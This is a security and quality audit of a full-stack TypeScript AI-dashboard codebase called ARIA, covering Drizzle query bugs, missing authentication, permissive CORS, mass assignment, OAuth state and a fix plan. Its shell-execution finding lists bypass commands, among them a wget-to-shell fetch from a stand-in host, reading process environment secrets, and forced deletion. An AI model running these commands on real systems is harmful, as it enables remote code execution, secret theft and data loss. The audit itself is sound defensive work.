# ARIA Codebase Diagnosis

Generated: Tuesday, August 4, 2026
Scope: Full-stack review of `artifacts/aria`, `artifacts/api-server`, `lib/*`, and workspace tooling.

---

## Summary

ARIA is a promising AI-coworker dashboard, but the codebase currently carries several **critical runtime bugs**, **security exposures**, and **maintainability issues**. The most urgent items are: (1) a broken message-count update in the conversations route, (2) an shell execution surface that is trivially bypassable, (3) no input validation/mass-assignment protection, (4) wide-open CORS with no authentication, and (5) no tests, lint, or migrations.

---

## 1. Critical Bugs (Fix Immediately)

### 1.1 `db.$count` does not exist — `POST /conversations/:id/messages` crashes
- **Location**: `artifacts/api-server/src/routes/conversations.ts`
- **Issue**:
  ```ts
  await db.update(conversationsTable).set({
    messageCount: db.$count(messagesTable, eq(messagesTable.conversationId, id)),
    updatedAt: new Date()
  }).where(...)
  ```
  `db.$count` is not a Drizzle API. Saving a plain message will throw `TypeError: db.$count is not a function`.
- **Impact**: Chat message persistence is broken for the non-AI save endpoint.
- **Fix**: Use the `count()` aggregate and a subquery/CTE, or query the count separately.
  ```ts
  import { count } from "drizzle-orm";
  const [{ total }] = await db
    .select({ total: count() })
    .from(messagesTable)
    .where(eq(messagesTable.conversationId, id));
  await db.update(conversationsTable)
    .set({ messageCount: total, updatedAt: new Date() })
    .where(eq(conversationsTable.id, id));
  ```

### 1.2 `messagesExchanged` is fabricated in `/agent/stats`
- **Location**: `artifacts/api-server/src/routes/agent.ts`
- **Issue**: `messagesExchanged: Number(msgCount?.total ?? 0) * 3` multiplies total messages by a magic number. The dashboard stat is misleading.
- **Impact**: Dashboard metric is incorrect.
- **Fix**: Use the actual total from `messagesTable` (and rename to `messagesTotal`).

### 1.3 `count(eq(tasksTable.status, "completed"))` returns wrong task stats
- **Location**: `artifacts/api-server/src/routes/agent.ts`
- **Issue**: `count(...)` counts rows and ignores its argument in Drizzle. Using `count(CASE WHEN ...)` or `sum()` is required to conditionally aggregate.
- **Impact**: All task-status stats in the dashboard will be equal to the total row count.
- **Fix**: Use `sql\`sum(case when status = 'completed' then 1 else 0 end)\`` or separate queries.

### 1.4 `openai.ts` route uses `msgCount = history.length + 2` instead of real count
- **Location**: `artifacts/api-server/src/routes/openai.ts`
- **Issue**: Conversation `messageCount` is updated using a client-side estimate instead of the database count. If messages are deleted, edited, or inserted concurrently, the value is wrong.
- **Fix**: Re-use the same counted total as the fix in 1.1.

### 1.5 `parseInt` on route params without validation
- **Location**: Multiple routes (`tasks.ts`, `conversations.ts`, `shell.ts`, `memory.ts`, `workflows.ts`, `integrations.ts`, `openai.ts`)
- **Issue**: `parseInt(req.params.id)` returns `NaN` for non-numeric input. The DB query then fails or returns no rows, causing 500s or confusing 404s.
- **Fix**: Validate with a Zod schema or helper, and return 400 for invalid IDs.
  ```ts
  const id = Number(req.params.id);
  if (!Number.isInteger(id)) return res.status(400).json({ error: "Invalid id" });
  ```

### 1.6 OpenAI route mounted on `/openai` but defines a `/conversations/:id/messages` path
- **Location**: `artifacts/api-server/src/routes/index.ts` + `openai.ts`
- **Issue**: The actual API path is `/api/openai/conversations/:id/messages`. This is non-RESTful and conflicts conceptually with the plain `POST /conversations/:id/messages` in `conversations.ts`. It is also likely out of sync with the OpenAPI spec if not updated there.
- **Fix**: Either merge the streaming endpoint into `conversations.ts` or rename its path to `/openai/stream/:id` and update the spec.

---

## 2. Security Issues (High Priority)

### 2.1 Shell execution is trivially bypassable
- **Location**: `artifacts/api-server/src/routes/shell.ts`
- **Issue**: Regex-only blacklisting (`rm -rf`, `mkfs`, etc.) cannot stop motivated misuse. Examples that slip through:
  - `rm -r -f /path`
  - `shred -n 1 file`
  - `python -c "import os; os.system('...')"`
  - `wget http://x.com/payload | sh`
  - `cat /proc/self/environ` to leak secrets
- **Impact**: Arbitrary remote code execution on the server.
- **Fix**:
  - Whitelist commands or run inside an isolated sandbox/container (gVisor, Firecracker, Docker with seccomp).
  - If that is infeasible, disable shell execution entirely behind strong auth.
  - Never run shell commands from an unauthenticated endpoint (see 2.3).

### 2.2 No authentication or authorization anywhere
- **Location**: Entire API (`artifacts/api-server/src/app.ts`)
- **Issue**: `app.use(cors())` is unrestricted and there is no session, token, or role check on any route. Anyone with network access can read/write tasks, memory, run shell commands, create conversations, and dispatch goals to APEX.
- **Impact**: Complete data exposure and system takeover.
- **Fix**: Implement session/JWT auth. At minimum, gate shell execution, agent config, memory, and APEX proxy behind the auth layer. Tie `SESSION_SECRET` to a real session middleware.

### 2.3 CORS is globally permissive
- **Location**: `artifacts/api-server/src/app.ts`
- **Issue**: `app.use(cors())` allows any origin.
- **Impact**: Cross-origin attacks if a user visits a malicious site while logged in.
- **Fix**: Restrict `cors()` to known origins from env vars.

### 2.4 Mass-assignment vulnerabilities on PATCH routes
- **Location**: `agent.ts`, `tasks.ts`, `memory.ts`, `workflows.ts`, `integrations.ts`
- **Issue**: `router.patch` handlers spread `req.body` directly into the DB update. For example, `PATCH /agent` can overwrite `id`, `createdAt`, `updatedAt`; `PATCH /tasks/:id` can set `completedAt` or `id`; `PATCH /integrations/:id` blocks tokens but still allows any other field.
- **Impact**: Data corruption, privilege escalation, unintended field writes.
- **Fix**: Validate and whitelist fields using the generated Zod schemas (`@workspace/api-zod`) before touching the DB.

### 2.5 OAuth state lacks signature / CSRF protection
- **Location**: `artifacts/api-server/src/routes/integrations.ts`
- **Issue**: `state` is base64url JSON with a timestamp but no HMAC. It also is not compared against a server-stored value.
- **Impact**: State tampering and CSRF during OAuth.
- **Fix**: Sign state with `SESSION_SECRET` (HMAC-SHA256) and verify the signature on callback.

### 2.6 Tokens and secrets are stored in the DB with no encryption at rest
- **Location**: `lib/db/src/schema/integrations.ts`
- **Issue**: `accessToken` and `refreshToken` are plain text. If the DB is compromised, all OAuth tokens are compromised.
- **Impact**: Third-party account takeover.
- **Fix**: Encrypt tokens with an env-var-provided key before storing, or use a vault. Ensure the encryption key is never committed.

### 2.7 APEX proxy forwards arbitrary request bodies and params unvalidated
- **Location**: `artifacts/api-server/src/routes/apex.ts`
- **Issue**: All APEX routes proxy the request body and query strings without validation. SSRF is possible if `APEX_BASE_URL` is compromised or changed.
- **Impact**: Server-side request forgery, abuse of APEX admin token.
- **Fix**: Define a strict Zod schema for the APEX request/response shape and validate before forwarding.

### 2.8 Error responses may leak stack traces or secrets
- **Location**: All route catch blocks
- **Issue**: Catch blocks return generic strings, but `req.log.error({ err }, ...)` may log full error objects. pino redacts headers, not arbitrary error messages.
- **Impact**: Secrets in logs.
- **Fix**: Sanitize logged errors; do not log `req.body` or raw `Error` objects from external libraries.

### 2.9 No rate limiting
- **Location**: API server
- **Issue**: No rate limits on chat, shell, OAuth, or APEX dispatch.
- **Impact**: Abuse, cost overruns, brute force.
- **Fix**: Add `express-rate-limit` (or Redis-backed equivalent) per route.

---

## 3. Data Layer / Schema Issues

### 3.1 No database migrations, only `drizzle-kit push`
- **Location**: `lib/db`
- **Issue**: Only one migration file exists (`0000_lovely_silver_fox.sql`). `push` is fine for dev but dangerous in production.
- **Impact**: Schema changes can drop/corrupt data in production.
- **Fix**: Generate and commit Drizzle migrations; run `drizzle-kit migrate` in production.

### 3.2 Enum columns use plain `text` without constraints
- **Location**: `lib/db/src/schema/*.ts`
- **Issue**: `status`, `priority`, `role`, etc. are unconstrained `text`. Invalid strings can be inserted from routes or direct DB access.
- **Impact**: Data integrity issues, frontend crashes on unexpected values.
- **Fix**: Use `pgEnum` or a `varchar` with a CHECK constraint.

### 3.3 Missing indexes
- **Location**: `lib/db/src/schema/conversations.ts`, `shell.ts`, `tasks.ts`, etc.
- **Issue**: Foreign keys and frequently filtered columns (`conversationId`, `sessionId`, `status`, `pinned`, `updatedAt`) have no indexes.
- **Impact**: Slow queries as data grows.
- **Fix**: Add `index()` declarations on FKs and query columns.

### 3.4 Denormalized `messageCount` is not maintained reliably
- **Location**: `lib/db/src/schema/conversations.ts`
- **Issue**: `messageCount` is stored on `conversations` but is only updated in some code paths and can drift.
- **Impact**: Stale dashboard stats.
- **Fix**: Use a view, a generated column, or compute on read. If denormalized, centralize updates in a repository function and add triggers/tests.

### 3.5 `tags`, `steps`, and `metadata` stored as strings
- **Location**: `tasks.ts` (`tags`), `workflows.ts` (`steps`), `actions.ts` (`metadata`)
- **Issue**: These should be structured data (`jsonb` or arrays). `tags` as a string cannot be queried; `metadata` is not typed.
- **Impact**: Brittle data handling, no validation.
- **Fix**: Use `jsonb` for `metadata` and `steps`; use a text array for `tags`.

### 3.6 No referential integrity for `agent` singleton
- **Location**: `lib/db/src/schema/agent.ts`
- **Issue**: The app assumes one agent row and inserts a new one if missing. There is nothing preventing multiple rows.
- **Impact**: Multiple agent rows can appear, causing inconsistent behavior.
- **Fix**: Use a single-row guard or a separate `settings` table with a fixed key.

---

## 4. Frontend Bugs / UX Issues

### 4.1 Chat page does not handle non-OK responses
- **Location**: `artifacts/aria/src/pages/chat.tsx`
- **Issue**: After `fetch`, the code only checks `res.body`. A 500 response with a body still enters the reader loop and likely fails silently.
- **Impact**: Users see an endless spinner or no feedback on errors.
- **Fix**: Check `res.ok` and surface an error message.

### 4.2 Chat streaming message is not persisted in React Query cache after completion
- **Location**: `artifacts/aria/src/pages/chat.tsx`
- **Issue**: The streaming assistant message is shown locally but the conversation query is never invalidated when streaming finishes.
- **Impact**: After a stream completes, the assistant message may not appear in the history until a manual refresh.
- **Fix**: Invalidate `useGetConversation` on stream completion.

### 4.3 Workflows page uses `steps.split(',')`
- **Location**: `artifacts/aria/src/pages/workflows.tsx`
- **Issue**: Assumes `steps` is a comma-separated string. If the schema ever becomes JSON/array, this breaks.
- **Fix**: Align with a typed schema.

### 4.4 Dashboard activity feed mixes `Action[]` and `ActivityDay[]`
- **Location**: `artifacts/aria/src/pages/dashboard.tsx`
- **Issue**: The code runtime-detects the shape. This suggests the API contract is undefined or the hook types are wrong.
- **Impact**: TypeScript cannot protect against shape changes; runtime rendering bugs possible.
- **Fix**: Fix the OpenAPI spec / generated types and render only one shape.

### 4.5 Tasks page mixes local tasks and APEX tasks without clear UX distinction
- **Location**: `artifacts/aria/src/pages/tasks.tsx`
- **Issue**: Local task cards use the same list as the APEX read-only panel. Users may not understand which tasks are local vs. swarm tasks.
- **Impact**: Confusion as ARIA transitions to APEX.
- **Fix**: Add clear sections/tabs: "Local Tasks" vs. "Apex Swarm".

### 4.6 `window.location.href = res.authUrl` without any security check
- **Location**: `artifacts/aria/src/pages/integrations.tsx`
- **Issue**: The frontend blindly redirects to a URL from the API. Although the API is trusted, there is no validation that the URL matches an known provider.
- **Fix**: Low risk in this context, but consider validating the hostname.

---

## 5. Code Quality / Maintainability

### 5.1 No tests
- **Issue**: No unit, integration, or E2E tests exist in the project.
- **Recommendation**: Add at minimum:
  - API route tests with a test DB (Vitest + `pg` + `drizzle-kit push --force` in a test script).
  - Frontend component tests with React Testing Library.
  - One happy-path test for the streaming chat endpoint.

### 5.2 No linting or formatting scripts
- **Issue**: `package.json` has no `lint`, `format`, or `check` scripts. Prettier is installed but not enforced.
- **Recommendation**: Add `lint`, `format:check`, and `format:write` scripts. Consider Biome or ESLint + Prettier.

### 5.3 Mixed package managers and tracked `node_modules`
- **Issue**: `package-lock.json` and `pnpm-lock.yaml` both exist, and the git status shows tracked `node_modules/.bin` files and deleted `node_modules` packages. The repo is likely bloated.
- **Recommendation**:
  - Remove `package-lock.json` from git.
  - Untrack `node_modules` completely.
  - Standardize on pnpm.

### 5.4 `openai` version conflict
- **Location**: Root `package.json` depends on `openai ^7.4.0`; `lib/integrations-openai-ai-server` depends on `openai ^6.27.0`.
- **Impact**: pnpm may install two copies, increasing bundle size and causing type mismatches.
- **Fix**: Consolidate to a single version via the workspace catalog.

### 5.5 `scripts/src/hello.ts` is dead code
- **Location**: `scripts/src/hello.ts`
- **Issue**: It only logs a string and is referenced by a `hello` script. It adds no value.
- **Fix**: Remove or replace with a useful build/seed script.

### 5.6 OpenAPI spec / generated code may drift from hand-written routes
- **Issue**: Many route files use hand-rolled Express code while the project advertises API-first codegen. The generated client hooks are used, but route shapes and validation are not.
- **Impact**: Spec and implementation can diverge silently.
- **Fix**: Use the generated Zod validators on request bodies. Generate the OpenAPI spec from the code or keep the hand routes in strict sync.

### 5.7 TypeScript strictness is reduced
- **Location**: `tsconfig.base.json`
- **Issue**: `strictFunctionTypes: false`, `noImplicitOverride: false`, `noUnusedLocals: false`.
- **Impact**: Missed bugs, weaker refactoring safety.
- **Fix**: Enable stricter flags incrementally.

### 5.8 `mockup-sandbox` artifact is undefined
- **Location**: `artifacts/mockup-sandbox`
- **Issue**: It exists with a full UI stack but no documented purpose or integration.
- **Fix**: Document its purpose or remove it.

---

## 6. Operational / Deployment Issues

### 6.1 Health check does not verify DB
- **Location**: `artifacts/api-server/src/routes/health.ts`
- **Issue**: `/healthz` always returns `ok`, even if the database is unreachable.
- **Fix**: Run a lightweight DB query (e.g., `SELECT 1`) and return 503 on failure.

### 6.2 No centralized error handler
- **Location**: `artifacts/api-server/src/app.ts`
- **Issue**: Express has no `app.use(errorHandler)`. Errors thrown after headers are sent or from async middleware can crash the process.
- **Fix**: Add an error-handling middleware and a process-wide `uncaughtException`/`unhandledRejection` handler.

### 6.3 `cookie-parser` is a dependency but never used
- **Location**: `artifacts/api-server/package.json` + `app.ts`
- **Issue**: Dead dependency.
- **Fix**: Remove it or use it for session cookies.

### 6.4 Shell timeout does not kill the child process
- **Location**: `artifacts/api-server/src/routes/shell.ts`
- **Issue**: `exec` timeout fires but the child may be left as a zombie.
- **Fix**: Use `spawn` with `child.kill()` on timeout, or use `AbortSignal`.

---

## 7. Prioritized Action Plan

### Immediate (this week)
1. Fix `db.$count` bug in `conversations.ts`.
2. Fix task stats aggregation in `agent.ts`.
3. Add route param validation (return 400 for invalid IDs).
4. Disable shell execution until it is sandboxed or behind strong auth.
5. Add authentication to the API and restrict CORS.
6. Add a centralized error handler and health check DB query.

### Short term (next 2 weeks)
7. Implement request-body validation using generated Zod schemas on all write routes.
8. Fix the OpenAI route path or spec mismatch.
9. Encrypt OAuth tokens at rest.
10. Add Drizzle migrations and stop using `push` in production.
11. Add tests for the most critical routes (health, agent, chat, shell).

### Medium term (next month)
12. Replace regex-based shell blocking with a real sandbox.
13. Add rate limiting.
14. Add indexes and CHECK constraints in the DB.
15. Consolidate `openai` versions and remove dead code.
16. Standardize lint/format scripts and run them in CI.
17. Untrack `node_modules` and remove mixed lock files.

---

## 8. Low-Priority Suggestions

- Rename `messagesExchanged` to `messagesTotal` and compute it correctly.
- Separate local tasks from APEX tasks in the UI.
- Add `zod`/`drizzle-zod` validation to all schemas and route inputs.
- Document the ARIA ↔ APEX merge flow and env vars in `QWEN.md`.
- Consider removing `mockup-sandbox` if it is unused.
- Add OpenAPI validation middleware (`express-openapi-validator`) to keep the spec honest.
